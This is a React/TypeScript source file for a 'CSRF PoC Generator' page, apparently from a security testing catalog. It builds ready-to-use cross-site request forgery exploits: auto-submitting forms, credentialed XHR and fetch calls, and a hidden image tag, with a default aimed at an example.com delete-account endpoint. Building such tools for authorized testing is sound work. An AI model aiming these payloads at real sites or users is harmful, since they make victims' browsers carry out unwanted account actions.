import { useMemo, useState } from 'react';
import { BackLink } from '../../components/BackLink';
import { AlertTriangle, Copy, Download, FileCode, Info, Shield, Zap } from 'lucide-react';

/**
 * /dfir/csrf-poc — Client-side CSRF proof-of-concept generator.
 *
 * Generates ready-to-use HTML PoCs for testing CSRF vulnerabilities.
 * All logic runs in-browser — no server round-trip.
 */

type Method = 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';
type Encoding = 'html' | 'url' | 'json';

interface CsrfField {
  name: string;
  value: string;
  type: 'text' | 'hidden' | 'submit' | 'checkbox' | 'select';
  options?: string;
}

interface CsrfConfig {
  targetUrl: string;
  method: Method;
  encoding: Encoding;
  fields: CsrfField[];
  includeAutoSubmit: boolean;
  includeXhr: boolean;
  customHeaders: string;
  withCredentials: boolean;
}

const DEFAULT_FIELDS: CsrfField[] = [
  { name: 'action', value: 'delete_account', type: 'hidden' },
  { name: 'user_id', value: '12345', type: 'hidden' },
  { name: 'submit', value: 'Submit', type: 'submit' },
];

const METHOD_COLORS: Record<Method, string> = {
  GET: 'bg-emerald-500/15 text-emerald-700 dark:text-emerald-300',
  POST: 'bg-blue-500/15 text-blue-700 dark:text-blue-300',
  PUT: 'bg-amber-500/15 text-amber-700 dark:text-amber-300',
  DELETE: 'bg-rose-500/15 text-rose-700 dark:text-rose-300',
  PATCH: 'bg-purple-500/15 text-purple-700 dark:text-purple-300',
};

function generateHtmlPoc(config: CsrfConfig): string {
  const { targetUrl, method, fields, includeAutoSubmit, withCredentials } = config;

  const fieldHtml = fields
    .map((f) => {
      if (f.type === 'submit') {
        return `    <input type="submit" name="${escHtml(f.name)}" value="${escHtml(f.value)}" />`;
      }
      if (f.type === 'checkbox') {
        return `    <input type="checkbox" name="${escHtml(f.name)}" value="${escHtml(f.value)}" checked />`;
      }
      if (f.type === 'select' && f.options) {
        const opts = f.options.split(',').map((o) => o.trim());
        return `    <select name="${escHtml(f.name)}">\n${opts.map((o) => `      <option value="${escHtml(o)}"${o === f.value ? ' selected' : ''}>${escHtml(o)}</option>`).join('\n')}\n    </select>`;
      }
      return `    <input type="${f.type}" name="${escHtml(f.name)}" value="${escHtml(f.value)}" />`;
    })
    .join('\n');

  const autoSubmitScript = includeAutoSubmit
    ? `\n  <script>document.getElementById('csrf-form').submit();</script>`
    : '';

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h2>CSRF Proof of Concept</h2>
  <p>Target: <code>${escHtml(targetUrl)}</code> (${method})</p>
  <form id="csrf-form" action="${escHtml(targetUrl)}" method="${method}"${withCredentials ? ' enctype="application/x-www-form-urlencoded"' : ''}>
${fieldHtml}
  </form>${autoSubmitScript}
</body>
</html>`;
}

function generateXhrPoc(config: CsrfConfig): string {
  const { targetUrl, method, fields, customHeaders, withCredentials } = config;

  const payload: Record<string, string> = {};
  for (const f of fields) {
    if (f.type !== 'submit') payload[f.name] = f.value;
  }

  const headers = customHeaders
    ? customHeaders.split('\n').filter(Boolean)
    : ['Content-Type: application/x-www-form-urlencoded'];

  const headersStr = headers
    .map(
      (h) =>
        `    xhr.setRequestHeader('${escJs(h.split(':')[0]?.trim() ?? '')}', '${escJs(h.split(':').slice(1).join(':').trim())}');`
    )
    .join('\n');

  return `<script>
  var xhr = new XMLHttpRequest();
  xhr.open('${method}', '${escJs(targetUrl)}', true);
${headersStr}
  xhr.withCredentials = ${withCredentials};
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      console.log('Status:', xhr.status);
      console.log('Response:', xhr.responseText);
    }
  };
  xhr.send('${escJs(new URLSearchParams(payload).toString())}');
</script>`;
}

function generateFetchPoc(config: CsrfConfig): string {
  const { targetUrl, method, fields, customHeaders, withCredentials } = config;

  const payload: Record<string, string> = {};
  for (const f of fields) {
    if (f.type !== 'submit') payload[f.name] = f.value;
  }

  const headers = customHeaders ? customHeaders.split('\n').filter(Boolean) : [];
  const headersObj = headers.reduce(
    (acc, h) => {
      const [k, ...v] = h.split(':');
      if (k) acc[k.trim()] = v.join(':').trim();
      return acc;
    },
    {} as Record<string, string>
  );

  return `<script>
  fetch('${escJs(targetUrl)}', {
    method: '${method}',
    credentials: '${withCredentials ? 'include' : 'same-origin'}',
    headers: ${JSON.stringify(headersObj, null, 4)},
    body: new URLSearchParams(${JSON.stringify(payload, null, 4)})
  })
  .then(r => r.text())
  .then(t => console.log(t))
  .catch(e => console.error(e));
</script>`;
}

function generateImgPoc(config: CsrfConfig): string {
  const { targetUrl, fields } = config;
  const qs = fields
    .filter((f) => f.type !== 'submit')
    .map((f) => `${encodeURIComponent(f.name)}=${encodeURIComponent(f.value)}`)
    .join('&');
  const url = qs ? `${targetUrl}?${qs}` : targetUrl;

  return `<img src="${escHtml(url)}" style="display:none" />`;
}

function escHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function escJs(s: string): string {
  return s.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n');
}

export default function CsrfPocGenerator(): JSX.Element {
  const [config, setConfig] = useState<CsrfConfig>({
    targetUrl: 'https://example.com/api/delete-account',
    method: 'POST',
    encoding: 'html',
    fields: DEFAULT_FIELDS,
    includeAutoSubmit: true,
    includeXhr: false,
    customHeaders: '',
    withCredentials: true,
  });

  const [copied, setCopied] = useState(false);

  const poc = useMemo(() => {
    if (config.includeXhr) return generateXhrPoc(config);
    if (config.encoding === 'json') return generateFetchPoc(config);
    return generateHtmlPoc(config);
  }, [config]);

  const imgPoc = useMemo(() => generateImgPoc(config), [config]);

  const updateField = (idx: number, patch: Partial<CsrfField>) => {
    setConfig((c) => ({
      ...c,
      fields: c.fields.map((f, i) => (i === idx ? { ...f, ...patch } : f)),
    }));
  };

  const addField = () => {
    setConfig((c) => ({
      ...c,
      fields: [...c.fields, { name: '', value: '', type: 'hidden' }],
    }));
  };

  const removeField = (idx: number) => {
    setConfig((c) => ({
      ...c,
      fields: c.fields.filter((_, i) => i !== idx),
    }));
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(poc);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // fallback
    }
  };

  const handleDownload = () => {
    const blob = new Blob([poc], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `csrf-poc-${Date.now()}.html`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="max-w-5xl mx-auto px-4 py-8">
      <BackLink to="/dfir">Back to DFIR Catalog</BackLink>
      <div className="flex items-center gap-3 mt-4 mb-2">
        <div className="p-2 rounded-lg bg-rose-500/10 text-rose-600 dark:text-rose-400">
          <Shield size={24} />
        </div>
        <div>
          <h1 className="text-2xl font-bold">CSRF PoC Generator</h1>
          <p className="text-sm text-slate-500 dark:text-slate-400">
            Generate ready-to-use HTML/XHR/fetch proof-of-concept exploits for CSRF testing
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mt-6">
        {/* Config Panel */}
        <div className="space-y-4">
          <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-100))] p-4">
            <h3 className="text-sm font-semibold mb-3 flex items-center gap-2">
              <Zap size={14} className="text-amber-500" /> Target Configuration
            </h3>

            <label className="block text-xs font-mono text-slate-500 mb-1">Target URL</label>
            <input
              type="url"
              value={config.targetUrl}
              onChange={(e) => setConfig((c) => ({ ...c, targetUrl: e.target.value }))}
              className="w-full px-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] font-mono text-sm"
              placeholder="https://example.com/api/action"
            />

            <div className="grid grid-cols-2 gap-3 mt-3">
              <div>
                <label className="block text-xs font-mono text-slate-500 mb-1">Method</label>
                <select
                  value={config.method}
                  onChange={(e) => setConfig((c) => ({ ...c, method: e.target.value as Method }))}
                  className="w-full px-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] font-mono text-sm"
                >
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                  <option value="DELETE">DELETE</option>
                  <option value="PATCH">PATCH</option>
                </select>
              </div>
              <div>
                <label className="block text-xs font-mono text-slate-500 mb-1">PoC Type</label>
                <select
                  value={config.includeXhr ? 'xhr' : config.encoding}
                  onChange={(e) => {
                    const v = e.target.value;
                    if (v === 'xhr') setConfig((c) => ({ ...c, includeXhr: true }));
                    else setConfig((c) => ({ ...c, includeXhr: false, encoding: v as Encoding }));
                  }}
                  className="w-full px-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] font-mono text-sm"
                >
                  <option value="html">HTML Form</option>
                  <option value="xhr">XMLHttpRequest</option>
                  <option value="json">Fetch API</option>
                </select>
              </div>
            </div>

            <div className="flex items-center gap-4 mt-3">
              <label className="flex items-center gap-2 text-xs">
                <input
                  type="checkbox"
                  checked={config.includeAutoSubmit}
                  onChange={(e) => setConfig((c) => ({ ...c, includeAutoSubmit: e.target.checked }))}
                  className="rounded"
                />
                Auto-submit
              </label>
              <label className="flex items-center gap-2 text-xs">
                <input
                  type="checkbox"
                  checked={config.withCredentials}
                  onChange={(e) => setConfig((c) => ({ ...c, withCredentials: e.target.checked }))}
                  className="rounded"
                />
                withCredentials
              </label>
            </div>
          </div>

          {/* Fields */}
          <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-100))] p-4">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold flex items-center gap-2">
                <FileCode size={14} className="text-blue-500" /> Form Fields
              </h3>
              <button
                type="button"
                onClick={addField}
                className="text-xs px-2 py-1 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500/20"
              >
                + Add Field
              </button>
            </div>

            <div className="space-y-2">
              {config.fields.map((f, i) => (
                <div key={i} className="flex items-center gap-2">
                  <select
                    value={f.type}
                    onChange={(e) => updateField(i, { type: e.target.value as CsrfField['type'] })}
                    className="w-24 px-2 py-1.5 rounded border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] text-xs font-mono"
                  >
                    <option value="hidden">hidden</option>
                    <option value="text">text</option>
                    <option value="submit">submit</option>
                    <option value="checkbox">checkbox</option>
                    <option value="select">select</option>
                  </select>
                  <input
                    type="text"
                    value={f.name}
                    onChange={(e) => updateField(i, { name: e.target.value })}
                    placeholder="name"
                    className="flex-1 px-2 py-1.5 rounded border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] text-xs font-mono"
                  />
                  <input
                    type="text"
                    value={f.value}
                    onChange={(e) => updateField(i, { value: e.target.value })}
                    placeholder="value"
                    className="flex-1 px-2 py-1.5 rounded border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] text-xs font-mono"
                  />
                  <button
                    type="button"
                    onClick={() => removeField(i)}
                    className="text-xs text-rose-500 hover:text-rose-700 px-1"
                  >
                    ✕
                  </button>
                </div>
              ))}
            </div>
          </div>

          {/* Custom Headers (XHR/Fetch only) */}
          {(config.includeXhr || config.encoding === 'json') && (
            <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-100))] p-4">
              <h3 className="text-sm font-semibold mb-3 flex items-center gap-2">
                <Info size={14} className="text-cyan-500" /> Custom Headers
              </h3>
              <textarea
                value={config.customHeaders}
                onChange={(e) => setConfig((c) => ({ ...c, customHeaders: e.target.value }))}
                placeholder="X-Custom-Header: value&#10;Authorization: Bearer token"
                rows={3}
                className="w-full px-3 py-2 rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] font-mono text-xs"
              />
            </div>
          )}
        </div>

        {/* Output Panel */}
        <div className="space-y-4">
          <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-100))] p-4">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold flex items-center gap-2">
                <FileCode size={14} className="text-emerald-500" /> Generated PoC
                <span className={`px-2 py-0.5 rounded text-xs font-mono ${METHOD_COLORS[config.method]}`}>
                  {config.method}
                </span>
              </h3>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={handleCopy}
                  className="flex items-center gap-1 text-xs px-2 py-1 rounded bg-slate-100 dark:bg-[rgb(var(--surface-200))] hover:bg-slate-200 dark:hover:bg-[rgb(var(--surface-300))]"
                >
                  <Copy size={12} /> {copied ? 'Copied!' : 'Copy'}
                </button>
                <button
                  type="button"
                  onClick={handleDownload}
                  className="flex items-center gap-1 text-xs px-2 py-1 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500/20"
                >
                  <Download size={12} /> Download
                </button>
              </div>
            </div>
            <pre className="bg-slate-900 text-slate-100 rounded-lg p-4 text-xs font-mono overflow-x-auto max-h-[500px] overflow-y-auto">
              {poc}
            </pre>
          </div>

          {/* GET-based img PoC */}
          {config.method === 'GET' && (
            <div className="rounded-xl border border-amber-200 dark:border-amber-500/30 bg-amber-50 dark:bg-amber-500/5 p-4">
              <div className="flex items-start gap-2">
                <AlertTriangle size={16} className="text-amber-500 mt-0.5 shrink-0" />
                <div>
                  <h4 className="text-sm font-semibold text-amber-700 dark:text-amber-300">
                    GET-based CSRF (Image Tag)
                  </h4>
                  <p className="text-xs text-amber-600 dark:text-amber-400 mt-1 mb-2">
                    For GET requests, an invisible img tag can trigger the request without user interaction:
                  </p>
                  <pre className="bg-slate-900 text-slate-100 rounded-lg p-3 text-xs font-mono overflow-x-auto">
                    {imgPoc}
                  </pre>
                </div>
              </div>
            </div>
          )}

          {/* Info */}
          <div className="rounded-xl border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--surface-200))] p-4">
            <h4 className="text-sm font-semibold mb-2 flex items-center gap-2">
              <Info size={14} className="text-slate-500" /> Usage Notes
            </h4>
            <ul className="text-xs text-slate-600 dark:text-slate-400 space-y-1 list-disc list-inside">
              <li>HTML Form — classic auto-submitting form, works in all browsers</li>
              <li>XMLHttpRequest — sends request via XHR, useful for same-origin testing</li>
              <li>Fetch API — modern async request with Promise-based handling</li>
              <li>
                <code className="px-1 py-0.5 bg-slate-200 dark:bg-[rgb(var(--surface-300))] rounded">
                  withCredentials
                </code>{' '}
                — include cookies/auth headers (same-origin or CORS-enabled targets)
              </li>
              <li>Always obtain proper authorization before testing CSRF on live applications</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
